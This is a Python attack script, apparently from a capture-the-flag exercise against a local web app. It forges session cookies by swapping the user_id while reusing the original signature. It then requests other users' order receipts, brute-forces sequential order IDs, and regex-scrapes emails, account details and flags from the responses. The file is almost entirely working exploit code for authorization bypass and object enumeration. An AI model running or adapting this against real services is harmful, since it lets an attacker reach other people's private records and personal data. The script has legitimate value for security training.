import requests
import base64
import json
import re

# Cookie components for tampering
cookie_template = "eyJ1c2VyX2lkIjoxMDAzMn0.aVfKCw.jl3AMMmNnBqRtf0OTxwr0Uo3aeg"
parts = cookie_template.split('.')
_, timestamp, signature = parts

print("[*] Testing receipt endpoint for IDOR vulnerabilities\n")

# From orders page we found these order IDs
order_ids = ['300123', '300214', '300327', '300481']

# Test different user IDs to see if we can access other users' receipts
print("[*] Testing receipt access with different user IDs:\n")

test_user_ids = [1, 2, 3, 10, 100, 1000, 9999, 10000, 10032]
all_findings = []

for user_id in test_user_ids:
    print(f"="*70)
    print(f"Testing with user_id={user_id}")
    print(f"="*70)
    
    # Create tampered session cookie
    test_payload = {"user_id": user_id}
    payload_str = json.dumps(test_payload, separators=(',', ':'))
    payload_b64 = base64.urlsafe_b64encode(payload_str.encode()).decode().rstrip('=')
    tampered_cookie = f"{payload_b64}.{timestamp}.{signature}"
    headers = {'Cookie': f'session={tampered_cookie}'}
    
    for order_id in order_ids:
        url = f"http://127.0.0.1:33198/order/{order_id}/receipt"
        print(f"\n[*] Testing: {url}")
        
        try:
            response = requests.get(url, headers=headers, timeout=5)
            
            print(f"  Status: {response.status_code}")
            print(f"  Length: {len(response.text)}B")
            
            # Check for flags
            flag_matches = re.findall(r'FLAG\{[^}]+\}', response.text)
            if flag_matches:
                print(f"  [!] FLAGS FOUND: {flag_matches}")
                all_findings.append({
                    'user_id': user_id,
                    'order_id': order_id,
                    'flags': flag_matches
                })
            
            # Look for interesting content patterns
            if len(response.text) > 200:  # Has content (not error page)
                print(f"  [+] Receipt data retrieved successfully")
                
                # Show first part of response
                print(f"  Response preview: {response.text[:200]}...")
                
                # Look for sensitive data patterns
                patterns = {
                    'emails': r'[\w\.%+-]+@[\w\.-]+\.[A-Za-z]{2,}',
                    'prices': r'\$\s*\d+[\.,]\d+',
                    'dates': r'\d{2}/\d{2}/\d{4}',
                    'account': r'Account[^<]{0,50}',
                    'user_info': r'User[^<]{0,50}',
                    'receipt': r'Receipt[^<]{0,50}'
                }
                
                for pattern_name, pattern_regex in patterns.items():
                    matches = re.findall(pattern_regex, response.text, re.IGNORECASE)
                    if matches:
                        unique_matches = list(set(matches))  # Remove duplicates
                        if len(unique_matches) <= 5:  # Only show reasonable number
                            print(f"  [{pattern_name.upper()}] {unique_matches}")
                        else:
                            print(f"  [{pattern_name.upper()}] {len(unique_matches)} found")
            
            # Check for error messages
            error_patterns = ['error', 'denied', 'forbidden', 'unauthorized', 'access']
            lower_text = response.text.lower()
            for err in error_patterns:
                if err in lower_text:
                    print(f"  [-] Contains '{err}' - likely blocked")
                    break
                    
        except Exception as e:
            print(f"  [!] Error: {e}")

# Also test sequential order IDs to find other orders
print("\n" + "="*70)
print("[*] Testing sequential order IDs to find other users' orders")
print("="*70)

# Use the valid user session
headers = {'Cookie': f'session={cookie_template}'}

# Test order IDs around the known ones
order_ranges = [
    (300100, 300201),  # Around 300123
    (300200, 300301),  # Around 300214  
    (300300, 300401),  # Around 300327
    (300400, 300501),  # Around 300481
    (299000, 299101),  # Much lower range
    (301000, 301101)   # Much higher range
]

found_orders = []

for start, end in order_ranges:
    print(f"\n[*] Testing order IDs {start}-{end-1}")
    found_in_range = 0
    
    for order_id_int in range(start, end):
        order_id = str(order_id_int)
        url = f"http://127.0.0.1:33198/order/{order_id}/receipt"
        
        try:
            response = requests.get(url, headers=headers, timeout=3)
            
            # Check if we got a valid receipt (not error page)
            if len(response.text) > 500 and response.status_code == 200:
                print(f"  [+] Found order: {order_id} | Length: {len(response.text)}B")
                found_orders.append(order_id)
                found_in_range += 1
                
                # Look for flags
                flags = re.findall(r'FLAG\{[^}]+\}', response.text)
                if flags:
                    print(f"    [!] FLAGS: {flags}")
                    all_findings.append({
                        'user_id': '10032',
                        'order_id': order_id,
                        'flags': flags
                    })
                
                # Show what makes it different
                if found_in_range == 1:
                    print(f"    Preview: {response.text[:150]}...")
            
        except Exception as e:
            print(f"  [!] Error on {order_id}: {e}")
    
    print(f"  Range complete. Found {found_in_range} valid orders.")

print("\n" + "="*70)
print("SUMMARY:")
print(f"Found {len(found_orders)} valid order IDs: {found_orders}")

if all_findings:
    print(f"\n[!] ALL FLAGS FOUND:")
    for finding in all_findings:
        print(f"  User {finding['user_id']}, Order {finding['order_id']}: {finding['flags']}")
else:
    print("\n[!] No flags found in receipt endpoints")
    print("[!] Consider testing with more user IDs or checking for other endpoints")
